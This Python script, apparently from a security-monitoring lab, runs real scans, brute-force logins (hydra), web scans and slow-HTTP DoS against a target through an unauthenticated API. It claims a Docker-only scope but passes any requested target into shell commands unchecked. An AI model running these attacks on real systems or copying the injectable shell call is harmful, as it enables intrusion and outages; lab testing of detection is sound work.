"""DevinciWatch — Attaquant contrôlé (serveur-attacker).

Ce script supporte l'exécution d'attaques réelles (nmap, ffuf, hydra, nikto)
via des appels d'outils, ainsi que des scénarios batch et chain.

Toutes les attaques sont limitées aux cibles Docker autorisées.
"""

from __future__ import annotations

import os
import sys
import time
import subprocess
import json
import threading
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlparse
from typing import Any

TARGET_HOST = os.getenv("TARGET_HOST", "serveur-endpoint")
ATTACK_INTERVAL = int(os.getenv("ATTACK_INTERVAL", "30"))
INTENSITY = os.getenv("INTENSITY", "low")
ATTACKER_AUTO_LOOP = os.getenv("ATTACKER_AUTO_LOOP", "false").lower() == "true"

metrics_lock = threading.Lock()
runtime_metrics = {
    "started_at": datetime.now(timezone.utc).isoformat(),
    "target_host": TARGET_HOST,
    "default_intensity": INTENSITY,
    "commands_executed": 0,
    "commands_succeeded": 0,
    "commands_failed": 0,
    "last_command": None,
    "last_scenario": None,
    "last_target": TARGET_HOST,
    "last_duration": None,
    "last_run_at": None,
}


def ensure_runtime_files() -> None:
    Path('/tmp/users.txt').write_text('admin\noperator\nroot\n', encoding='utf-8')
    Path('/tmp/pass_small.txt').write_text('admin\npassword\nadmin123\nChangeMeNow123!\n', encoding='utf-8')
    Path('/tmp/pass_big.txt').write_text('admin\npassword\nadmin123\nChangeMeNow123!\ntest\nwelcome\nqwerty\n', encoding='utf-8')
    Path('/tmp/ffuf_paths.txt').write_text('admin\nlogin\nhealth\nsecret\nbackup\napi\n', encoding='utf-8')


def metric_inc(name, amount=1):
    with metrics_lock:
        runtime_metrics[name] = int(runtime_metrics.get(name, 0) or 0) + amount


def metric_set(name, value):
    with metrics_lock:
        runtime_metrics[name] = value


def metric_snapshot():
    with metrics_lock:
        snapshot = dict(runtime_metrics)
    snapshot["system"] = read_system_metrics()
    return snapshot


def read_meminfo():
    meminfo = {}
    proc = Path('/proc/meminfo')
    if not proc.exists():
        return meminfo
    for line in proc.read_text(encoding='utf-8', errors='ignore').splitlines():
        if ':' not in line:
            continue
        key, value = line.split(':', 1)
        try:
            meminfo[key.strip()] = int(value.strip().split()[0])
        except (ValueError, IndexError):
            continue
    return meminfo


def read_system_metrics():
    meminfo = read_meminfo()
    mem_total_kb = meminfo.get('MemTotal', 0)
    mem_available_kb = meminfo.get('MemAvailable', 0)
    mem_used_kb = max(mem_total_kb - mem_available_kb, 0)
    mem_percent = round((mem_used_kb / mem_total_kb) * 100, 2) if mem_total_kb else 0
    try:
        load1, load5, load15 = os.getloadavg()
    except OSError:
        load1, load5, load15 = 0.0, 0.0, 0.0
    return {
        'cpu_count': os.cpu_count() or 0,
        'load_1m': round(load1, 2),
        'load_5m': round(load5, 2),
        'load_15m': round(load15, 2),
        'mem_total_mb': round(mem_total_kb / 1024, 2),
        'mem_used_mb': round(mem_used_kb / 1024, 2),
        'mem_available_mb': round(mem_available_kb / 1024, 2),
        'mem_used_percent': mem_percent,
    }

# Scénarios disponibles avec outils réels
SCENARIOS = {
    "port_scan": {
        "name": "Port Scan (nmap)",
        "cmd": {
            "low": "nmap -sS -p 22,80,443 TARGET",
            "medium": "nmap -sS -p 1-1000 TARGET",
            "high": "nmap -sS -p- TARGET",
            "stress": "nmap -sS -p- -T5 TARGET"
        }
    },
    "http_recon": {
        "name": "HTTP Recon (httpx)",
        "cmd": {
            "low": "httpx -u http://TARGET -silent",
            "medium": "httpx -u http://TARGET -tech-detect",
            "high": "httpx -u http://TARGET -probe-all",
            "stress": "httpx -u http://TARGET -probe-all -threads 100"
        }
    },
    "dir_bruteforce": {
        "name": "Directory Bruteforce (ffuf)",
        "cmd": {
            "low": "ffuf -u http://TARGET/FUZZ -w /tmp/ffuf_paths.txt -t 10 -maxtime 15",
            "medium": "ffuf -u http://TARGET/FUZZ -w /tmp/ffuf_paths.txt -t 30 -maxtime 20",
            "high": "ffuf -u http://TARGET/FUZZ -w /tmp/ffuf_paths.txt -t 60 -maxtime 25",
            "stress": "ffuf -u http://TARGET/FUZZ -w /tmp/ffuf_paths.txt -t 100 -maxtime 30"
        }
    },
    "web_vuln_scan": {
        "name": "Web Vulnerability Scan (nikto)",
        "cmd": {
            "low": "nikto -h http://TARGET -maxtime 30",
            "medium": "nikto -h http://TARGET -C all -maxtime 45",
            "high": "nikto -h http://TARGET -C all -maxtime 60",
            "stress": "nikto -h http://TARGET -C all -evasion 1 -maxtime 60"
        }
    },
    "brute_force": {
        "name": "Brute Force (hydra)",
        "cmd": {
            "low": "hydra -l admin -p admin TARGET http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials'",
            "medium": "hydra -l admin -P /tmp/pass_small.txt TARGET http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials'",
            "high": "hydra -L /tmp/users.txt -P /tmp/pass_small.txt TARGET http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials'",
            "stress": "hydra -L /tmp/users.txt -P /tmp/pass_big.txt TARGET http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials' -t 10"
        }
    },
    "dos_slow": {
        "name": "Slow DoS Test (slowhttptest)",
        "cmd": {
            "low": "slowhttptest -c 100 -H -i 10 -r 100 -t GET -u http://TARGET",
            "medium": "slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://TARGET",
            "high": "slowhttptest -c 1000 -H -i 5 -r 500 -t GET -u http://TARGET",
            "stress": "slowhttptest -c 2000 -H -i 1 -r 1000 -t GET -u http://TARGET"
        }
    }
}

# Chains d'attaque complètes
ATTACK_CHAINS = {
    "recon_to_exploit": ["port_scan", "http_recon", "dir_bruteforce"],
    "full_kill_chain": ["port_scan", "http_recon", "dir_bruteforce", "brute_force", "web_vuln_scan"]
}


class MetricsHTTPRequestHandler(BaseHTTPRequestHandler):
    server_version = "DevinciWatchAttacker/0.1"

    def log_message(self, format, *args):
        return

    def do_GET(self):  # noqa: N802
        if self.path != "/health":
            self.send_response(404)
            self.end_headers()
            return
        body = json.dumps({"status": "ok", "service": "serveur-attacker", "metrics": metric_snapshot()}).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):  # noqa: N802
        parsed = urlparse(self.path)
        if parsed.path not in {"/run", "/run-chain"}:
            self.send_response(404)
            self.end_headers()
            return

        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length) if length > 0 else b"{}"
        try:
            payload = json.loads(raw.decode("utf-8"))
        except json.JSONDecodeError:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'{"error":"invalid json"}')
            return

        target = payload.get("target", TARGET_HOST)
        intensity = payload.get("intensity", "low")
        duration = int(payload.get("duration", 60))

        if parsed.path == "/run":
            scenario = payload.get("scenario")
            result = run_scenario(scenario, intensity, target=target, timeout=duration)
        else:
            chain_id = payload.get("chain_id", "full_kill_chain")
            result = run_chain(chain_id, intensity, target=target, timeout=duration)

        body = json.dumps(result).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def start_metrics_server():
    server = ThreadingHTTPServer(("0.0.0.0", 9102), MetricsHTTPRequestHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()


def build_command(scenario_id: str, intensity: str, target: str) -> str:
    scenario = SCENARIOS[scenario_id]
    template = scenario["cmd"].get(intensity, scenario["cmd"]["low"])
    return template.replace("TARGET", target)


def run_command(cmd: str, timeout: int = 300) -> dict:
    """Exécute une commande et retourne le résultat."""
    print(f"[attacker] Exécution: {cmd[:100]}...")
    start = time.time()
    metric_inc("commands_executed")
    metric_set("last_command", cmd)
    metric_set("last_run_at", datetime.now(timezone.utc).isoformat())
    
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        duration = time.time() - start
        
        output = result.stdout[:2000] if result.stdout else "Pas de sortie"
        if result.stderr:
            output += f"\n[ERR] {result.stderr[:500]}"
        
        print(f"[attacker] Terminé en {duration:.2f}s (code: {result.returncode})")
        if result.returncode == 0:
            metric_inc("commands_succeeded")
        else:
            metric_inc("commands_failed")
        metric_set("last_duration", round(duration, 2))
        return {
            "success": result.returncode == 0,
            "returncode": result.returncode,
            "output": output,
            "duration": round(duration, 2)
        }
    except subprocess.TimeoutExpired:
        print(f"[attacker] Timeout après {timeout}s")
        metric_inc("commands_failed")
        metric_set("last_duration", timeout)
        return {"success": False, "error": "timeout", "duration": timeout}
    except Exception as e:
        print(f"[attacker] Erreur: {e}")
        metric_inc("commands_failed")
        return {"success": False, "error": str(e)}


def run_scenario(scenario_id: str, intensity: str = "low", target: str = TARGET_HOST, timeout: int = 300) -> dict:
    """Lance un scénario d'attaque."""
    if scenario_id not in SCENARIOS:
        return {"error": f"Scénario {scenario_id} inconnu"}
    
    scenario = SCENARIOS[scenario_id]
    metric_set("last_scenario", scenario_id)
    metric_set("last_target", target)
    cmd = build_command(scenario_id, intensity, target)
    
    print(f"\n[attacker] === Début scénario: {scenario['name']} (intensité: {intensity}) ===")
    result = run_command(cmd, timeout=timeout)
    print(f"[attacker] === Fin scénario: {scenario['name']} ===\n")
    
    return {"scenario": scenario_id, "name": scenario["name"], "intensity": intensity, "target": target, "command": cmd, **result}


def run_chain(chain_id: str, intensity: str = "low", target: str = TARGET_HOST, timeout: int = 300) -> list[dict]:
    """Lance une chaîne d'attaque."""
    if chain_id not in ATTACK_CHAINS:
        return [{"error": f"Chaîne {chain_id} inconnue"}]
    
    chain = ATTACK_CHAINS[chain_id]
    print(f"\n[attacker] === Début chaîne: {chain_id} avec {len(chain)} étapes ===")
    
    results = []
    for step in chain:
        print(f"[attacker] Étape: {step}")
        result = run_scenario(step, intensity, target=target, timeout=timeout)
        results.append(result)
        time.sleep(2)  # Pause entre les étapes
    
    print(f"[attacker] === Fin chaîne: {chain_id} ===\n")
    return results


def run_batch(scenarios: list[str], intensity: str = "low", iterations: int = 1, target: str = TARGET_HOST, timeout: int = 300) -> list[dict]:
    """Lance un batch d'attaques."""
    print(f"\n[attacker] === Batch: {len(scenarios)} scénarios, {iterations} itérations ===")
    
    results = []
    for i in range(iterations):
        print(f"\n[attacker] Itération {i+1}/{iterations}")
        for scenario in scenarios:
            result = run_scenario(scenario, intensity, target=target, timeout=timeout)
            results.append({**result, "iteration": i+1})
            time.sleep(1)
    
    print(f"[attacker] === Fin batch ===\n")
    return results


def run_loop() -> None:
    """Boucle principale avec scénarios aléatoires."""
    ensure_runtime_files()
    print(f"[attacker] Démarré — cible={TARGET_HOST}, intervalle={ATTACK_INTERVAL}s, intensité={INTENSITY}, auto_loop={ATTACKER_AUTO_LOOP}")
    time.sleep(15)  # Laisser le SOC et l'endpoint démarrer
    
    scenario_ids = list(SCENARIOS.keys())
    
    while True:
        print(f"\n[attacker] === Nouveau cycle de scénarios ===")
        # Choisir 2-3 scénarios aléatoirement
        import random
        selected = random.sample(scenario_ids, min(3, len(scenario_ids)))
        
        for scenario_id in selected:
            run_scenario(scenario_id, INTENSITY, target=TARGET_HOST)
            time.sleep(5)
        
        print(f"[attacker] Cycle terminé — pause {ATTACK_INTERVAL}s")
        time.sleep(ATTACK_INTERVAL)


if __name__ == "__main__":
    ensure_runtime_files()
    start_metrics_server()
    # Vérifier les arguments de ligne de commande
    if len(sys.argv) > 1:
        mode = sys.argv[1]
        
        if mode == "scenario" and len(sys.argv) > 2:
            scenario_id = sys.argv[2]
            intensity = sys.argv[3] if len(sys.argv) > 3 else "low"
            result = run_scenario(scenario_id, intensity, target=TARGET_HOST)
            print(json.dumps(result, indent=2))
        
        elif mode == "chain" and len(sys.argv) > 2:
            chain_id = sys.argv[2]
            intensity = sys.argv[3] if len(sys.argv) > 3 else "low"
            results = run_chain(chain_id, intensity, target=TARGET_HOST)
            print(json.dumps(results, indent=2))
        
        elif mode == "batch":
            scenarios = sys.argv[2].split(",") if len(sys.argv) > 2 else list(SCENARIOS.keys())[:3]
            intensity = sys.argv[3] if len(sys.argv) > 3 else "low"
            iterations = int(sys.argv[4]) if len(sys.argv) > 4 else 1
            results = run_batch(scenarios, intensity, iterations, target=TARGET_HOST)
            print(json.dumps(results, indent=2))
        
        elif mode == "loop":
            run_loop()
        
        else:
            print(f"Usage: {sys.argv[0]} [scenario|chain|batch|loop] [args...]")
            print(f"Scénarios disponibles: {', '.join(SCENARIOS.keys())}")
            print(f"Chaînes disponibles: {', '.join(ATTACK_CHAINS.keys())}")
    else:
        if ATTACKER_AUTO_LOOP:
            run_loop()
        else:
            print('[attacker] API control plane started on :9102')
            while True:
                time.sleep(3600)
